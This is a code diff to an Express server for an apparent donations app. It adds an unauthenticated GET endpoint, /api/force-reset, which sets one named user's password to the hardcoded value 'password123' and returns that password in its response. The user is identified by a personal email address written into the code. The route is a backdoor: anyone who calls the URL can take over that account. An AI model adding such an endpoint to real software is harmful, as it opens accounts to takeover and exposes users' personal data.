@@ -87,6 +87,18 @@ app.use('/api/donations', require('./routes/donationRoutes'));
 const currencyController = require('./controllers/currencyController');
 app.get('/api/currency/rates', currencyController.getRates);
 
+app.get('/api/force-reset', async (req, res) => {
+    try {
+        const db = require('./config/database');
+        const bcrypt = require('bcryptjs');
+        const hash = await bcrypt.hash('password123', 10);
+        await db.query("UPDATE users SET password_hash = $1 WHERE email = 'lizeth.barberette@gmail.com'", [hash]);
+        res.json({ success: true, message: 'Password reset to password123' });
+    } catch (e) {
+        res.json({ error: e.message });
+    }
+});
+
 // Rutas básicas (placeholder)
 app.get('/api/health', async (req, res) => {
     try {
